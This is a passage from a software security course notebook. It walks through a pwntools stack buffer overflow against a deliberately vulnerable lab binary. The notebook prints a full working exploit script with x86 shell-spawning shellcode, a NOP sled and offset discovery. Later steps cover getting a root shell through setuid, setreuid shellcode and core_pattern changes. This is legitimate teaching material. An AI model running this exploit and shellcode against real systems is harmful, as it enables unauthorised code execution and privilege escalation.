- run the default template as it is
- run with GDB argument


```bash
%%bash
# Compile vuln.cpp file in shellcraft folder
input="pwntools/shellcraft/vuln_arg.cpp"
output="pwntools/shellcraft/vuln_arg.exe"
echo kali | sudo -S ./compile.sh $input $output
```

    pwntools/shellcraft/vuln_arg.cpp: In function â€˜int main(int, char**)â€™:
    pwntools/shellcraft/vuln_arg.cpp:17:14: warning: unused parameter â€˜argcâ€™ [-Wunused-parameter]
       17 | int main(int argc, char** argv) {
          |          ~~~~^~~~



```python
! ./pwntools/shellcraft/vuln_arg.exe "hello there"
```

    hello there
    Buffer is at 0xffffb560



```python
%cd pwntools/shellcraft
```

    /workspaces/SoftwareSecurity/demos/pwntools/shellcraft



```python
! pwn template vuln_arg.exe > template_exploit.py
```

    [*] Automatically detecting challenge binaries...



```python
! cat template_exploit.py
```

    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    # This exploit template was generated via:
    # $ pwn template vuln_arg.exe
    from pwn import *
    
    # Set up pwntools for the correct architecture
    exe = context.binary = ELF(args.EXE or 'vuln_arg.exe')
    
    # Many built-in settings can be controlled on the command-line and show up
    # in "args".  For example, to dump all data sent/received, and disable ASLR
    # for all created processes...
    # ./exploit.py DEBUG NOASLR
    
    
    
    def start(argv=[], *a, **kw):
        '''Start the exploit against the target.'''
        if args.GDB:
            return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        else:
            return process([exe.path] + argv, *a, **kw)
    
    # Specify your GDB script here for debugging
    # GDB will be launched if the exploit is run via e.g.
    # ./exploit.py GDB
    gdbscript = '''
    tbreak main
    continue
    '''.format(**locals())
    
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     i386-32-little
    # RELRO:      Partial RELRO
    # Stack:      No canary found
    # NX:         NX unknown - GNU_STACK missing
    # PIE:        No PIE (0x8048000)
    # Stack:      Executable
    # RWX:        Has RWX segments
    # SHSTK:      Enabled
    # IBT:        Enabled
    # Stripped:   No
    # Debuginfo:  Yes
    
    io = start()
    
    # shellcode = asm(shellcraft.sh())
    # payload = fit({
    #     32: 0xdeadbeef,
    #     'iaaa': [1, 2, 'Hello', 3]
    # }, length=128)
    # io.send(payload)
    # flag = io.recv(...)
    # log.success(flag)
    
    io.interactive()
    


### See the complete demo

- see the demo `demos/pwntools/shellcraft/exploit_vuln_arg.py`
- open a Terminal and cd into the `shellcraft` folder
- run the exploit code from the Terminal to interact with the exploited shell


```python
! pwd
```

    /workspaces/SoftwareSecurity/demos/pwntools/shellcraft



```python
! cat exploit_vuln_arg.py
```

    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    # This exploit template was generated via:
    # $ pwn template vuln_arg.exe
    from pwn import *
    
    # Set up pwntools for the correct architecture
    exe = context.binary = ELF(args.EXE or 'vuln_arg.exe')
    
    # Many built-in settings can be controlled on the command-line and show up
    # in "args".  For example, to dump all data sent/received, and disable ASLR
    # for all created processes...
    # ./exploit_vuln_arg.py DEBUG NOASLR
    
    def start(argv=[], *a, **kw):
        '''Start the exploit against the target.'''
        if args.GDB:
            return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        else:
            return process([exe.path] + argv, *a, **kw)
    
    # Specify your GDB script here for debugging
    # GDB will be launched if the exploit is run via e.g.
    # ./exploit.py GDB
    gdbscript = '''
    tbreak main
    continue
    '''.format(**locals())
    
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     i386-32-little
    # RELRO:      Partial RELRO
    # Stack:      No canary found
    # NX:         NX unknown - GNU_STACK missing
    # PIE:        No PIE (0x8048000)
    # Stack:      Executable
    # RWX:        Has RWX segments
    # Stripped:   No
    # Debuginfo:  Yes
    
    # find the address of the buffer
    arg_len = 200 # long enough to overflow the return address/EIP!
    payload = b"A"*arg_len
    argv = [payload]
    io = start(argv)
    output = io.recvline()
    # receive the same ouput as the argument sent
    print(f'{output=}')
    assert output.decode('utf-8').strip() == payload.decode('utf-8')
    
    # find the address from the output; !! not realistic!!
    # NOTE buffer address captrued using this technique is also not reliable as it shifts based on
    # the size of the argument passed to main!
    label = io.recvuntil(b' at ')
    #output1 = io.recvline()
    #print(f'{output1=}')
    buf_address = int(io.recvline().decode('utf-8').strip(), base=16)
    print(f'{label}: {buf_address:#010x}')
    
    # crash the program using cyclic pattern and find the offset and address of buffer; realistic!
    # this is a reliable technique as it shows
    pattern = cyclic(arg_len, n=4)
    argv = [pattern]
    io = start(argv)
    io.wait()
    core = io.corefile
    offset = cyclic_find(core.eip, n=4)
    
    print(f'ESP is at {core.esp:#010x}')
    print(f'EIP contains {core.eip:#010x}')
    print(f'Offset to EIP from buffer add: {offset}')
    
    buf_address1 = core.esp-(offset+4)
    
    print(f'{buf_address1=:#010x}')
    repeat_ret_address = p32(buf_address1)*5
    
    # get the shellcode using pwntools
    #shellcode_user = asm(shellcraft.sh())
    #shellcode_user = asm(shellcraft.i386.linux.sh())
    
    #print(hexdump(shellcode_user))
    # x86/linux/exec: 24 bytes; copied from shellcode/x86-linux-sh.py file
    # payload = fit({
    #     32: 0xdeadbeef,
    #     'iaaa': [1, 2, 'Hello', 3]
    # }, length=128)
    # io.send(payload)
    # flag = io.recv(...)
    # log.success(flag)
    
    shellcode_user = (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )
    
    sled_len = offset+4 - len(repeat_ret_address)-len(shellcode_user)
    NOPSled = b'\x90'*sled_len  # asm('nop')
    payload = NOPSled + shellcode_user + repeat_ret_address
    payload += b"A"*(arg_len - len(payload))
    
    # Final io tube with the same argv as the one that crashed and created core file
    io = start([payload])
    
    # Interact with the shell
    io.interactive()
    


## Getting root shell

- let's run the same exploit code on setuid root program
- change the ownership of `vuln_arg.exe` to root
- make it a setuid program with `+s` setting
- NOTE - must run the `shellcraft/exploit_vuln_arg.py` file with sudo to access the coredump that is root owned!
- if you somehow got unlucky and got `\x00` in some part of the buffer address, change the arg_len variable
    - make it longer...


```python
! pwd
```


```python
! ls -al vuln_arg.exe
```


```python
! echo kali | sudo -S chown root vuln_arg.exe
```


```python
! echo kali | sudo -S chmod +s vuln_arg.exe
```


```python
! ls -al vuln_arg.exe
```


```python
! sudo -E python exploit_vuln_arg.py
```


```python
# if you get pwn library not found error for root, 
# you have to install pwntools in the system's Python installation
! echo kali | sudo -S apt install python3-pwntools
```

## Change the regular shell to root shell

- user shellcode gives your root shell if you create a soft link /bin/sh pointing to /bin/zsh
- use the root shellcode provided in the shellcode folder
- can also create setuid binary using pwntools and prepend it to the regular user shell
- make sure target program is root owned 
- set seteuid of the target program
- generate setuid binary using pwntools's shellcraft
- prepend the bytes generated to the user root shell

```bash
(base) â”Œâ”€â”€(kaliã‰¿kali)-[~/SoftwareSecurity/demos/pwntools/shellcraft]
â””â”€$ shellcraft -f d i386.linux.setreuid 0
\x31\xdb\x6a\x46\x58\x89\xd9\xcd\x80
```
- change the core pattern to make sure core.%p is the pattern

```bash
echo kali | sudo -S sysctl -w kernel.core_pattern=core.%p
```
- set ulimit to unlimited


### coredump of setuid programs
- must run the exploit_code with sudo to read the coredump of setuid programs

- run the exploit code as root

```bash
sudo -E python exploit_vuln_arg.py
```

## Exploiting Stackoverflow with standard input

- same concept as exploiting via main's `argv`
- slighlty easier to exploit because the stack and buffer addresss will not shift based on the input length
    - will still shift around if ASLR is turned ON!
- compile `demos/pwntools/shellcraft/so_stdio_no_add.cpp` file
- create an exploit code using pwn template and library
- get regular shell and root shell!
- left as an exercise to hone your exploit development skill


```python
! cat so_stdio_no_add.cpp
```


```python

```
